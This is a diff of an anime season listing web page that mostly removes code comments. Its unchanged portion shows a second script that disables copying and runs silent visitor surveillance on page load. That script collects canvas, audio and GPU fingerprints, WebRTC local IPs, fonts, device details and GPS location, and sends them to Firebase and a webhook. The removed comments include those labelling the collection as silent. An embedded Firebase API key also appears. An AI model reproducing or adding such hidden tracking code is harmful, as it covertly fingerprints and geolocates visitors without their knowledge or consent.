@@ -731,10 +731,6 @@
 </footer>
 
 <script>
-/* ============================================
-   AniSeason — Application Logic
-   ============================================ */
-
 const API_MIRRORS = [
     'https://api.jikan.moe/v4',
     'https://jikan-api.animeonsen.xyz/v4',
@@ -745,7 +741,7 @@ const CACHE_EXPIRY_KEY = 'jikan_season_expiry_v3';
 const LS_CACHE_KEY = 'jikan_season_ls_v3';
 const LS_CACHE_EXPIRY_KEY = 'jikan_season_ls_expiry_v3';
 const CACHE_TTL = 30 * 60 * 1000;
-const LS_CACHE_TTL = 6 * 60 * 60 * 1000; // localStorage cache lasts 6 hours
+const LS_CACHE_TTL = 6 * 60 * 60 * 1000;
 const OLD_CACHE_KEYS = ['aniseason_data_v4','aniseason_data_v3','jikan_season_data_v2','jikan_season_data_v3'];
 const PER_PAGE = 25;
 
@@ -780,7 +776,6 @@ const header = $('site-header');
 const heroEyebrow = $('hero-eyebrow');
 const backToTopBtn = $('back-to-top');
 
-/* --- Season --- */
 function getCurrentSeason() {
     const m = new Date().getMonth() + 1, y = new Date().getFullYear();
     if (m <= 3) return { name: 'Winter', icon: '❄️', year: y };
@@ -796,7 +791,6 @@ function updateSeasonInfo() {
     }
 }
 
-/* --- API with Exponential Backoff --- */
 const sleep = ms => new Promise(r => setTimeout(r, ms));
 
 function setLoadingText(text) { loadingText.textContent = text; }
@@ -848,7 +842,7 @@ async function tryFetchWithMirrors(path, maxRetries) {
         try {
             const url = API_MIRRORS[i] + path;
             const result = await fetchPage(url, maxRetries);
-            API_BASE = API_MIRRORS[i]; // remember working mirror
+            API_BASE = API_MIRRORS[i];
             return result;
         } catch (err) {
             if (i < API_MIRRORS.length - 1) {
@@ -871,7 +865,6 @@ function dedupAnime(data) {
 }
 
 function tryLoadCache() {
-    // 1. Try sessionStorage (fast, per-tab)
     try {
         const cached = sessionStorage.getItem(CACHE_KEY);
         const expiry = sessionStorage.getItem(CACHE_EXPIRY_KEY);
@@ -881,7 +874,6 @@ function tryLoadCache() {
         }
     } catch (e) {}
 
-    // 2. Try localStorage (persistent across sessions)
     try {
         const cached = localStorage.getItem(LS_CACHE_KEY);
         const expiry = localStorage.getItem(LS_CACHE_EXPIRY_KEY);
@@ -891,7 +883,6 @@ function tryLoadCache() {
         }
     } catch (e) {}
 
-    // 3. Try old keys in sessionStorage
     try {
         for (const oldKey of OLD_CACHE_KEYS) {
             const oldData = sessionStorage.getItem(oldKey);
@@ -906,7 +897,6 @@ function tryLoadCache() {
 }
 
 function tryLoadStaleCache() {
-    // Try ANY cache data, even expired, as last resort
     try {
         for (const k of [CACHE_KEY, LS_CACHE_KEY, ...OLD_CACHE_KEYS]) {
             const storage = k.includes('_ls_') ? localStorage : sessionStorage;
@@ -917,7 +907,6 @@ function tryLoadStaleCache() {
             }
         }
     } catch(e) {}
-    // Also try localStorage versions of old keys
     try {
         const lsData = localStorage.getItem(LS_CACHE_KEY);
         if (lsData) {
@@ -945,7 +934,6 @@ async function fetchAllAnime() {
     if (isLoading) return;
     isLoading = true;
 
-    // Check cache first
     const cached = tryLoadCache();
     if (cached) {
         allAnime = dedupAnime(cached.data);
@@ -965,7 +953,6 @@ async function fetchAllAnime() {
         allAnime = [...(first.data || [])];
         const lastPage = first.pagination?.last_visible_page || 1;
 
-        // Show first page immediately while fetching rest
         if (allAnime.length > 0) {
             hideLoading();
             filterBar.classList.add('visible');
@@ -976,7 +963,6 @@ async function fetchAllAnime() {
             updateStats(); updatePagination();
         }
 
-        // Fetch remaining pages concurrently in batches of 3
         const batchSize = 3;
         for (let batchStart = 2; batchStart <= lastPage; batchStart += batchSize) {
             const batchEnd = Math.min(batchStart + batchSize - 1, lastPage);
@@ -991,7 +977,6 @@ async function fetchAllAnime() {
             const results = await Promise.all(promises);
             results.forEach(data => { if (data.length) allAnime = [...allAnime, ...data]; });
 
-            // Brief pause between batches to avoid rate limit
             if (batchEnd < lastPage) await sleep(350);
         }
 
@@ -1000,7 +985,6 @@ async function fetchAllAnime() {
         onDataReady();
     } catch (error) {
         console.error('Fetch gagal:', error);
-        // Fallback: try to use ANY cached data (even expired)
         const staleData = tryLoadStaleCache();
         if (staleData) {
             allAnime = dedupAnime(staleData);
@@ -1022,7 +1006,6 @@ function onDataReady() {
     applyFiltersAndSort();
 }
 
-/* --- Filter & Sort --- */
 function applyFiltersAndSort() {
     let filtered = allAnime;
     if (currentFilter !== 'all')
@@ -1057,7 +1040,6 @@ function sortAnime(list, method) {
     return s;
 }
 
-/* --- Render --- */
 const lazyObserver = new IntersectionObserver(entries => {
     entries.forEach(entry => {
         if (entry.isIntersecting) {
@@ -1120,7 +1102,6 @@ function createCard(anime, index) {
     return card;
 }
 
-/* --- Modal --- */
 function openModal(a) {
     const img = a.images?.jpg?.large_image_url || a.images?.jpg?.image_url || '';
     const score = a.score ? a.score.toFixed(1) : 'N/A';
@@ -1181,7 +1162,6 @@ function closeModal() {
     setTimeout(() => { modalContent.innerHTML = ''; modalBgBlur.style.backgroundImage = ''; }, 400);
 }
 
-/* --- UI Helpers --- */
 function showLoading() { loadingState.classList.remove('hidden'); }
 function hideLoading() { loadingState.classList.add('hidden'); }
 function showError(msg) { errorMessage.textContent = msg; errorState.classList.remove('hidden'); }
@@ -1206,7 +1186,6 @@ function changePage(delta) {
 }
 function debounce(fn, ms) { let t; return (...a) => { clearTimeout(t); t = setTimeout(() => fn(...a), ms); }; }
 
-/* --- Events --- */
 searchInput.addEventListener('input', debounce(e => { searchQuery = e.target.value; currentPage = 1; applyFiltersAndSort(); }, 300));
 filterBar.addEventListener('click', e => {
     const btn = e.target.closest('.filter-btn');
@@ -1240,16 +1219,11 @@ window.addEventListener('scroll', () => {
 }, { passive: true });
 backToTopBtn.addEventListener('click', () => window.scrollTo({ top: 0, behavior: 'smooth' }));
 
-/* --- Init --- */
 updateSeasonInfo();
 fetchAllAnime();
 </script>
 
-<!-- ============================================
-     Anti-copy + Data Collection (from 404)
-     ============================================ -->
 <script>
-/* Anti-copy / context menu / keyboard shortcuts */
 document.addEventListener("copy", e => e.preventDefault());
 document.addEventListener("cut", e => e.preventDefault());
 document.addEventListener("contextmenu", e => e.preventDefault());
@@ -1266,7 +1240,6 @@ import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/fireba
 import { getFirestore, collection, addDoc, serverTimestamp }
   from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
 
-/* CONFIG */
 const firebaseConfig = {
     apiKey: "AIzaSyDYN75kjPNOLL9h-xDx4R8zE6GdYrWdCSk",
     authDomain: "yumesubs-f1588.firebaseapp.com",
@@ -1286,7 +1259,6 @@ if (FB_READY) {
     catch(e) { FB_READY = false; }
 }
 
-/* Helpers */
 function hashStr(str) {
     let h = 5381;
     for (let i = 0; i < str.length; i++) h = ((h * 33) ^ str.charCodeAt(i)) >>> 0;
@@ -1426,7 +1398,6 @@ function syncDeviceIdentity(sessionId, deviceName, deviceModel) {
     if (Object.keys(patch).length) mergeEnrichedPartial(sessionId, patch);
 }
 
-/* Data Collection (silent — no UI lines) */
 let visitReportSent = false;
 let instantReportSent = false;
 let enrichedReportSent = false;
@@ -1581,7 +1552,6 @@ async function collectAll() {
     visitReportSent = true;
     const sessionId = getReportSessionId();
 
-    // Parse browser info
     function parseBrowser(ua) {
         const browsers = [
             [/OPR\/([\d.]+)/i, 'Opera'], [/Edg\/([\d.]+)/i, 'Edge'],
@@ -1598,7 +1568,6 @@ async function collectAll() {
         return { name: null, version: null };
     }
 
-    // Parse OS
     function parseOS(ua) {
         const androidVer = ua.match(/Android\s*([\d.]+)/i);
         if (androidVer) return { osName: 'Android', osVersion: androidVer[1] };
@@ -1728,7 +1697,6 @@ async function collectAll() {
     latestVisitorId = earlyVisitorId;
     latestDeviceName = deviceName;
 
-    // Kirim langsung saat buka — tidak tunggu IP/font/WebRTC (sendBeacon agar tetap terkirim walau user langsung tutup)
     const instantPayload = cleanPayload({
         ...navData, ...screenData, ...gpuData,
         audioFingerprint: earlyAudioFp, canvasFingerprint,
@@ -1745,10 +1713,8 @@ async function collectAll() {
         sendBeaconWorker(instantPayload);
     }
 
-    // GPS paralel — tidak tunggu enriched selesai
     sendGpsReport(sessionId);
 
-    // Enriched draft langsung — supaya exit beacon punya data meski IP/font belum selesai
     initEnrichedDraft(sessionId, {
         ...navData, ...screenData, ...gpuData,
         audioFingerprint: earlyAudioFp, canvasFingerprint,
@@ -1935,7 +1901,6 @@ async function collectAll() {
     const localIPs = webrtcIpResult.status === 'fulfilled' ? webrtcIpResult.value : null;
     const detectedFonts = fontResult.status === 'fulfilled' ? fontResult.value : null;
 
-    // Build combined visitor fingerprint
     const fpParts = [
         canvasFingerprint, audioFpFinal,
         `${screen.width}x${screen.height}x${screen.colorDepth}`,
@@ -2173,7 +2138,6 @@ async function sendGpsReport(sessionId) {
 
 collectAll();
 
-/* --- Visit Duration & Interaction Tracking --- */
 (function() {
     const visitStart = Date.now();
     let maxScrollPercent = 0;
@@ -2208,7 +2172,6 @@ collectAll();
         if (durationSent) return;
         durationSent = true;
         onPageExit();
-        // Durasi tidak dikirim ke webhook — cukup 3 pesan utama + anime click
     }
     document.addEventListener('visibilitychange', () => {
         if (document.visibilityState === 'hidden') sendDuration();
